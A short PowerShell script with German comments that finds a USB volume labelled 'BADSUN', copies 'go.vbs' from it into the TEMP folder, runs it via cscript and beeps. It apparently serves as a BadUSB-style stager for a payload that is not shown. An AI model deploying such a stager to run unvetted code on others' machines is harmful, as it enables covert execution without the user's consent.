function Get-USBDriveLetter {
    $usbDrive = Get-CimInstance -ClassName Win32_Volume -Filter "Label = 'BADSUN'" | Select-Object -First 1
    return $usbDrive.DriveLetter
}

# USB-Laufwerksbuchstaben ermitteln
$usbDriveLetter = Get-USBDriveLetter

if ($usbDriveLetter) {
    # Pfad zur PowerShell-Datei auf dem USB-Laufwerk
    $usbScriptPath = Join-Path -Path $usbDriveLetter -ChildPath "go.vbs"
    
    # Pfad zum temporären Ordner
    $tempScriptPath = Join-Path -Path $env:TEMP -ChildPath "go.vbs"

    try {
        # Datei vom USB-Laufwerk in den temporären Ordner kopieren
        Copy-Item -Path $usbScriptPath -Destination $tempScriptPath -Force

        # VBScript im Hintergrund ausführen
        cscript.exe $tempScriptPath

        # Sound abspielen
        [System.Media.SystemSounds]::Beep.Play()

    } catch {
        Write-Host "Fehler beim Kopieren oder Ausführen des Skripts: $_"
    }
} else {
    Write-Host "USB-Laufwerk wurde nicht gefunden."
}
